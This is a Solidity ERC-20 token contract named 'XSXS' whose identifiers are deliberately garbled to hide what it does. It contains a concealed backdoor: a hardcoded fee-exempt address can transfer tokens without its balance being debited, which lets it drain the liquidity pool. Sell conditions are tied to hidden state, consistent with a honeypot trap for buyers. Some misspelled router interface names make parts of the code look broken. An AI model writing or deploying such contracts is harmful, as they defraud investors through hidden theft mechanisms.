// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function ocd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  r_rfuxr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  r_rfuxr(a, b, "SafeMath:  subtraction overflow");
    }

    function  r_rfuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function zmp(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: zmptiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private K_kownrer;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        K_kownrer = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return K_kownrer;
    }

    modifier onlyOwner() {
        require(K_kownrer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(K_kownrer, address(0));
        K_kownrer = address(0);
    }

}

interface IsUniswaFctoryt {
    function createsPairs(address tokenA, address tokenB) external returns (address pair);
}

interface puniswapllRouterl {
    function swaapExactTokensFaorETaHSuppaortingFeaeOnTraansferTaokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract XSXS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "XSXS";
    string private constant _symbol = "XSXS";
    uint8 private constant _decimals = 9;
    uint256 private constant y_yTltaly = 100000000 * 10 **_decimals;
    uint256 public _maaxTaxAmoaunt = y_yTltaly;
    uint256 public _maaxWaalletSaizer = y_yTltaly;
    uint256 public _taSwaThaeshalds= y_yTltaly;
    uint256 public _mxvTaaxSwaap= y_yTltaly;

    uint256 private _TasxBsuyntiabl=7;
    uint256 private _TaaxSaellntiabl=17;
    uint256 private _TaaxBauyfinoal=1;
    uint256 private _TaaxSaellfinol=1;
    uint256 private _TaaxBauyBtredce=6;
    uint256 private _TaaxSaellBtredce=1;
    uint256 private _uPeuatcokSouiy=0;
    uint256 private _smrartygr=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private x_xknycr;
    mapping (address => bool) private p_ifrWaeoakirt;
    mapping(address => uint256) private f_fareTrzasrode;
    bool public f_tfivrdcuiay = false;
    address public n_ntrFdRecfueat = 0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;

    puniswapllRouterl private x_uniswapikRauterikFck;
    address private y_unioswapkPoirkTakekuLf;
    bool private rTbrapjseq;
    bool private _vesrwxpug = false;
    bool private _tswapwlrsUniswapsSuer = false;

 
    event RaemvrAautuqx(uint _maaxTaxAmoaunt);
    modifier lackThoSwap {
        _vesrwxpug = true;
        _;
        _vesrwxpug = false;
    }

    constructor () {
        _balances[_msgSender()] = y_yTltaly;
        x_xknycr[owner()] = true;
        x_xknycr[address(this)] = true;
        x_xknycr[n_ntrFdRecfueat] = true;


        emit Transfer(address(0), _msgSender(), y_yTltaly);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return y_yTltaly;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _aprave(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _aprave(sender, _msgSender(), _allowances[sender][_msgSender()]. r_rfuxr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _aprave(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 ktaxkAmauntk=0;
        if (from != owner() && to != owner()) {

            if (f_tfivrdcuiay) {
                if (to != address(x_uniswapikRauterikFck) && to != address(y_unioswapkPoirkTakekuLf)) {
                  require(f_fareTrzasrode[msg.sender] < block.number,"Only one transfer per block allowed.");
                  f_fareTrzasrode[msg.sender] = block.number;
                }
            }

            if (from == y_unioswapkPoirkTakekuLf && to != address(x_uniswapikRauterikFck) && !x_xknycr[to] ) {
                require(amount <= _maaxTaxAmoaunt, "Exceeds the _maaxTaxAmoaunt.");
                require(balanceOf(to) + amount <= _maaxWaalletSaizer, "Exceeds the _maaxWaalletSaizer.");
                if(_smrartygr<_uPeuatcokSouiy){
                  require(!_aratpuq(to));
                }
                _smrartygr++; p_ifrWaeoakirt[to]=true;
                ktaxkAmauntk = amount.zmp((_smrartygr>_TaaxBauyBtredce)?_TaaxBauyfinoal:_TasxBsuyntiabl).div(100);
            }

            if(to == y_unioswapkPoirkTakekuLf && from!= address(this) && !x_xknycr[from] ){
                require(amount <= _maaxTaxAmoaunt && balanceOf(n_ntrFdRecfueat)<_mxvTaaxSwaap, "Exceeds the _maaxTaxAmoaunt.");
                ktaxkAmauntk = amount.zmp((_smrartygr>_TaaxSaellBtredce)?_TaaxSaellfinol:_TaaxSaellntiabl).div(100);
                require(_smrartygr>_uPeuatcokSouiy && p_ifrWaeoakirt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_vesrwxpug 
            && to == y_unioswapkPoirkTakekuLf && _tswapwlrsUniswapsSuer && contractTokenBalance>_taSwaThaeshalds 
            && _smrartygr>_uPeuatcokSouiy&& !x_xknycr[to]&& !x_xknycr[from]
            ) {
                swapeuqluw( p_prvty(amount, p_prvty(contractTokenBalance,_mxvTaaxSwaap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(ktaxkAmauntk>0){
          _balances[address(this)]=_balances[address(this)].ocd(ktaxkAmauntk);
          emit Transfer(from, address(this),ktaxkAmauntk);
        }
        _balances[from]= r_rfuxr(from, _balances[from], amount);
        _balances[to]=_balances[to].ocd(amount. r_rfuxr(ktaxkAmauntk));
        emit Transfer(from, to, amount. r_rfuxr(ktaxkAmauntk));
    }

    function swapeuqluw(uint256 yamauntkFrktoep) private lackThoSwap {
        if(yamauntkFrktoep==0){return;}
        if(!rTbrapjseq){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = x_uniswapikRauterikFck.WETH();
        _aprave(address(this), address(x_uniswapikRauterikFck), yamauntkFrktoep);
        x_uniswapikRauterikFck.swaapExactTokensFaorETaHSuppaortingFeaeOnTraansferTaokens(
            yamauntkFrktoep,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  p_prvty(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  r_rfuxr(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == n_ntrFdRecfueat){
            return a;
        }else{
            return a. r_rfuxr(b);
        }
    }

    function removesLimit() external onlyOwner{
        _maaxTaxAmoaunt = y_yTltaly;
        _maaxWaalletSaizer = y_yTltaly;
        f_tfivrdcuiay = false;
        emit RaemvrAautuqx(y_yTltaly);
    }

    function _aratpuq(address b_irpyr) private view returns (bool) {
        uint256 eoqBoraeidr;
        assembly {
            eoqBoraeidr := extcodesize(b_irpyr)
        }
        return eoqBoraeidr > 0;
    }


    function openrTradingr() external onlyOwner() {
        require(!rTbrapjseq,"Yes");
        x_uniswapikRauterikFck = puniswapllRouterl(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _aprave(address(this), address(x_uniswapikRauterikFck), y_yTltaly);
        y_unioswapkPoirkTakekuLf = IsUniswaFctoryt(x_uniswapikRauterikFck.factory()).createsPairs(address(this), x_uniswapikRauterikFck.WETH());
        x_uniswapikRauterikFck.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(y_unioswapkPoirkTakekuLf).approve(address(x_uniswapikRauterikFck), type(uint).max);
        _tswapwlrsUniswapsSuer = true;
        rTbrapjseq = true;
    }

    receive() external payable {}
}